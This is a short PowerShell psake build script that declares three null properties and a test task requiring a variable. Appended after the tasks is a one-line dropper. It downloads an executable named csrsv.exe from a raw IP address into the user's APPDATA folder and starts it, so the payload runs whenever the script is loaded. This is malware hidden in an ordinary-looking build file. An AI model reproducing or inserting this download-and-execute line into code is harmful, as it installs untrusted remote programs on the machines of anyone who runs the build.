properties {
    $x = $null
    $y = $null
    $z = $null
}

task default -depends TestProperties

task TestProperties -requiredVariables z{
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

